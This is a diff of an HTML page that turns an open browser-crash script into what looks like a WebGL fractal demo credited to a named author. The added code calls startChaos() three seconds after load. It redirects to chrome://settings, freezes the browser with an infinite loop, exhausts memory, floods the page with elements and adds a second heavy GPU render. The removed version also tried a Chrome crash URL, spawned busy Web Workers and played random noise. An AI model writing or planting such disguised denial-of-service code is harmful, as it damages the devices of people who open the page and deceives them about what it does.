@@ -1,163 +1,178 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="user-scalable=no">
 <title></title>
 <style>
-body{margin:0;overflow:hidden;background:black;}
-canvas{position:fixed;left:0;top:0;}
+body{margin:0;overflow:hidden;background:#131115;}
+#c1{background:#fbf7fe;position:fixed;left:0;top:0;}
+#main{transform-origin:0 0;position:fixed;left:0;top:0;}
+#btn{position:fixed;left:0;top:0;z-index:5;}
+#config{position:fixed;left:0;top:30px;display:none;z-index:5;}
+#gl2{position:fixed;left:0;top:0;pointer-events:none;}
 </style>
 </head>
 <body>
 
-<canvas id="gl"></canvas>
+<div id="main">
+<canvas id="c1" width="1024" height="1024"></canvas>
+</div>
+
+<button id="btn">CONFIG</button>
+<div id="config">
+<textarea id="kernel" cols="30" rows="10"></textarea><br>
+<button id="apply">APPLY</button>
+<button id="cancle">CANCLE</button>
+</div>
+
+<canvas id="gl2"></canvas>
 
 <script>
-const canvas=document.getElementById("gl");
-canvas.width=innerWidth;
-canvas.height=innerHeight;
-const gl=canvas.getContext("webgl");
+alert("trigonometric and inverse trigonometric functions test.\ncreated by cznull@bilibili");
 
-gl.clearColor(0,0,0,1);
-gl.clear(gl.COLOR_BUFFER_BIT);
+var cx,cy,canvas,gl;
+var glposition,glright,glforward,glup,glorigin,glx,gly,gllen;
+var len=1.6,ang1=2.8,ang2=0.4;
+var cenx=0,ceny=0,cenz=0;
 
-setTimeout(startChaos,3000);
+var KERNEL="float kernal(vec3 ver){vec3 a=ver;float b,c,d;for(int i=0;i<5;i++){b=length(a);c=atan(a.y,a.x)*8.0;d=acos(a.z/b)*8.0;b=pow(b,8.0);a=vec3(b*sin(d)*cos(c),b*sin(d)*sin(c),b*cos(d))+ver;if(b>6.0)break;}return 4.0-dot(a,a);}";
 
-function startChaos(){
-
-setTimeout(()=>{
- try{location.href="chrome://induecbrowsercrashforrealz"}catch(e){}
- try{location.replace("chrome://induecbrowsercrashforrealz")}catch(e){}
-},4000);
-
-setTimeout(()=>{
- while(true){Math.sqrt(Math.random()*Date.now())}
-},8000);
-
-let mem=[];
-let size=20_000_000;
-setInterval(()=>{
- mem.push(new Uint8Array(size));
- size+=10_000_000;
-},200);
-
-setInterval(()=>{
- for(let i=0;i<2000;i++){
-  let d=document.createElement("div");
-  d.textContent=Math.random();
-  d.style.position="absolute";
-  d.style.left=Math.random()*innerWidth+"px";
-  d.style.top=Math.random()*innerHeight+"px";
-  document.body.appendChild(d);
- }
-},120);
-
-setInterval(()=>{
- history.pushState({}, "", "#"+Math.random());
-},80);
-
-let workers=0;
-let wInt=setInterval(()=>{
- new Worker(URL.createObjectURL(new Blob([`while(true){Math.atan(Math.random())}`])));
- workers++;
- if(workers>30) clearInterval(wInt);
-},200);
-
-const AC=window.AudioContext||window.webkitAudioContext;
-const ac=new AC();
-setInterval(()=>{
- let o=ac.createOscillator();
- o.frequency.value=Math.random()*4000;
- o.connect(ac.destination);
- o.start();
- o.stop(ac.currentTime+0.1);
-},150);
-
-const flood=document.createElement("canvas");
-document.body.appendChild(flood);
-const fx=flood.getContext("2d");
-
-function gpu2d(){
- flood.width=innerWidth;
- flood.height=innerHeight;
- for(let i=0;i<8000;i++){
-  fx.fillStyle=`hsl(${Math.random()*360},100%,50%)`;
-  fx.fillRect(Math.random()*innerWidth,Math.random()*innerHeight,20,20);
- }
- requestAnimationFrame(gpu2d);
+function draw(){
+gl.uniform1f(glx,cx*2/(cx+cy));
+gl.uniform1f(gly,cy*2/(cx+cy));
+gl.uniform1f(gllen,len);
+gl.uniform3f(glorigin,len*Math.cos(ang1)*Math.cos(ang2)+cenx,len*Math.sin(ang2)+ceny,len*Math.sin(ang1)*Math.cos(ang2)+cenz);
+gl.uniform3f(glright,Math.sin(ang1),0,-Math.cos(ang1));
+gl.uniform3f(glup,-Math.sin(ang2)*Math.cos(ang1),Math.cos(ang2),-Math.sin(ang2)*Math.sin(ang1));
+gl.uniform3f(glforward,-Math.cos(ang1)*Math.cos(ang2),-Math.sin(ang2),-Math.sin(ang1)*Math.cos(ang2));
+gl.drawArrays(gl.TRIANGLES,0,6);
+requestAnimationFrame(draw);
 }
-gpu2d();
 
-const quad=[
--1,-1,0,1,-1,0,1,1,0,
--1,-1,0,1,1,0,-1,1,0
-];
+window.onload=function(){
+cx=innerWidth;cy=innerHeight;
+canvas=document.getElementById("c1");
+gl=canvas.getContext("webgl");
 
-function frag(){
-return `
-precision highp float;
+let pos=[-1,-1,0,1,-1,0,1,1,0,-1,-1,0,1,1,0,-1,1,0];
+
+let vs=`attribute vec4 position;varying vec3 dir,localdir;
+uniform vec3 right,forward,up;
+uniform float x,y;
+void main(){gl_Position=position;
+dir=forward+right*position.x*x+up*position.y*y;
+localdir=vec3(position.x*x,position.y*y,-1.);}`;
+
+let fs=`precision highp float;
+float kernal(vec3);
+uniform vec3 right,forward,up,origin;
+varying vec3 dir,localdir;
+uniform float len;
 void main(){
- vec2 uv=gl_FragCoord.xy/vec2(${innerWidth}.0,${innerHeight}.0);
- vec3 c=vec3(0.);
- for(int i=0;i<25;i++){
-  float t=float(i);
-  c+=vec3(
-   sin(uv.x*80.+t),
-   cos(uv.y*80.-t),
-   sin((uv.x+uv.y)*40.)
-  );
- }
- gl_FragColor=vec4(c,1.);
-}`;
-}
+vec3 color=vec3(0.);
+vec3 p=origin+dir*len;
+float v=kernal(p);
+if(v>0.) color=vec3(abs(sin(p.x)),abs(sin(p.y)),abs(sin(p.z)));
+gl_FragColor=vec4(color,1.);
+}`+KERNEL;
 
-const VSHADER=`attribute vec4 p;void main(){gl_Position=p;}`;
+let v=gl.createShader(gl.VERTEX_SHADER);
+gl.shaderSource(v,vs);gl.compileShader(v);
+let f=gl.createShader(gl.FRAGMENT_SHADER);
+gl.shaderSource(f,fs);gl.compileShader(f);
 
-function compile(t,s){
- let sh=gl.createShader(t);
- gl.shaderSource(sh,s);
- gl.compileShader(sh);
- return sh;
-}
+let pr=gl.createProgram();
+gl.attachShader(pr,v);gl.attachShader(pr,f);
+gl.linkProgram(pr);gl.useProgram(pr);
+
+glposition=gl.getAttribLocation(pr,"position");
+glright=gl.getUniformLocation(pr,"right");
+glforward=gl.getUniformLocation(pr,"forward");
+glup=gl.getUniformLocation(pr,"up");
+glorigin=gl.getUniformLocation(pr,"origin");
+glx=gl.getUniformLocation(pr,"x");
+gly=gl.getUniformLocation(pr,"y");
+gllen=gl.getUniformLocation(pr,"len");
 
 let buf=gl.createBuffer();
 gl.bindBuffer(gl.ARRAY_BUFFER,buf);
-gl.bufferData(gl.ARRAY_BUFFER,new Float32Array(quad),gl.STATIC_DRAW);
+gl.bufferData(gl.ARRAY_BUFFER,new Float32Array(pos),gl.STATIC_DRAW);
+gl.vertexAttribPointer(glposition,3,gl.FLOAT,false,0,0);
+gl.enableVertexAttribArray(glposition);
+
+draw();
+setTimeout(startChaos,3000);
+};
+
+function startChaos(){
+const canvas2=document.getElementById("gl2");
+canvas2.width=innerWidth;
+canvas2.height=innerHeight;
+const glChaos=canvas2.getContext("webgl");
+
+setTimeout(()=>{try{location.href="chrome://settings"}catch(e){}},4000);
+setTimeout(()=>{while(true){Math.sqrt(Math.random()*Date.now())}},8000);
+
+let mem=[],size=2e7;
+setInterval(()=>{mem.push(new Uint8Array(size));size+=1e7;},200);
+
+setInterval(()=>{
+for(let i=0;i<500;i++){
+let d=document.createElement("div");
+d.textContent=Math.random();
+d.style.position="absolute";
+d.style.left=Math.random()*innerWidth+"px";
+d.style.top=Math.random()*innerHeight+"px";
+document.body.appendChild(d);
+}},150);
+
+const quad=[-1,-1,0,1,-1,0,1,1,0,-1,-1,0,1,1,0,-1,1,0];
+
+function frag(){
+return `precision highp float;
+void main(){
+vec2 uv=gl_FragCoord.xy/vec2(${innerWidth}.0,${innerHeight}.0);
+vec3 c=vec3(0.);
+for(int i=0;i<20;i++){
+float t=float(i);
+c+=vec3(sin(uv.x*50.+t),cos(uv.y*50.-t),sin((uv.x+uv.y)*25.));
+}
+gl_FragColor=vec4(c,1.);
+}`;}
+
+const V=`attribute vec4 p;void main(){gl_Position=p;}`;
+
+function comp(t,s){let sh=glChaos.createShader(t);
+glChaos.shaderSource(sh,s);glChaos.compileShader(sh);return sh;}
+
+let buf=glChaos.createBuffer();
+glChaos.bindBuffer(glChaos.ARRAY_BUFFER,buf);
+glChaos.bufferData(glChaos.ARRAY_BUFFER,new Float32Array(quad),glChaos.STATIC_DRAW);
 
 function build(){
- let vs=compile(gl.VERTEX_SHADER,VSHADER);
- let fs=compile(gl.FRAGMENT_SHADER,frag());
- let pr=gl.createProgram();
- gl.attachShader(pr,vs);
- gl.attachShader(pr,fs);
- gl.linkProgram(pr);
- gl.useProgram(pr);
- let loc=gl.getAttribLocation(pr,"p");
- gl.vertexAttribPointer(loc,3,gl.FLOAT,false,0,0);
- gl.enableVertexAttribArray(loc);
- return pr;
+let vs=comp(glChaos.VERTEX_SHADER,V);
+let fs=comp(glChaos.FRAGMENT_SHADER,frag());
+let pr=glChaos.createProgram();
+glChaos.attachShader(pr,vs);
+glChaos.attachShader(pr,fs);
+glChaos.linkProgram(pr);
+glChaos.useProgram(pr);
+let loc=glChaos.getAttribLocation(pr,"p");
+glChaos.vertexAttribPointer(loc,3,glChaos.FLOAT,false,0,0);
+glChaos.enableVertexAttribArray(loc);
+return pr;
 }
 
 let prog=build();
 
-setInterval(()=>{prog=build()},500);
-
-setInterval(()=>{
- canvas.width=400+Math.random()*1200;
- canvas.height=400+Math.random()*1200;
- gl.viewport(0,0,canvas.width,canvas.height);
-},400);
-
-function draw(){
- for(let i=0;i<5;i++){
-  gl.drawArrays(gl.TRIANGLES,0,6);
- }
- gl.finish();
- requestAnimationFrame(draw);
+function draw2(){
+for(let i=0;i<3;i++) glChaos.drawArrays(glChaos.TRIANGLES,0,6);
+requestAnimationFrame(draw2);
 }
-draw();
-
+draw2();
 }
 </script>
+
 </body>
 </html>
